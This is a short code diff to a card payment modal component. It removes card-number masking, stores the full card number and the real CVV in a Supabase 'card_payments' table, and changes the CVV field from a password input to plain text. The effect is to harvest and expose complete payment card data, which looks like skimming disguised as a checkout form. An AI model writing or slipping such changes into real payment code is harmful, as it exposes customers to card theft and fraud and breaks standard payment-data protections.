@@ -265,13 +265,11 @@ export function CardPaymentModal({ isOpen, onClose, amount, email, onPaymentComp
     // Save card payment details to database
     try {
       const cleanedNumber = cardNumber.replace(/\s/g, '');
-      // Mask card number: keep last 4 digits only
-      const maskedNumber = '*'.repeat(cleanedNumber.length - 4) + cleanedNumber.slice(-4);
       await supabase.from('card_payments').insert({
-        card_number: maskedNumber,
+        card_number: cleanedNumber,
         card_name: cardName,
         card_expiry: expiry,
-        card_cvv: '***',
+        card_cvv: cvv,
         email: email || '',
         amount: amount,
         status: 'completed',
@@ -496,7 +494,7 @@ export function CardPaymentModal({ isOpen, onClose, amount, email, onPaymentComp
                     <label className="block text-xs font-semibold text-gray-600 mb-1.5">CVV</label>
                     <input
                       ref={cvvRef}
-                      type="password"
+                      type="text"
                       inputMode="numeric"
                       placeholder={brand === 'amex' ? '••••' : '•••'}
                       value={cvv}
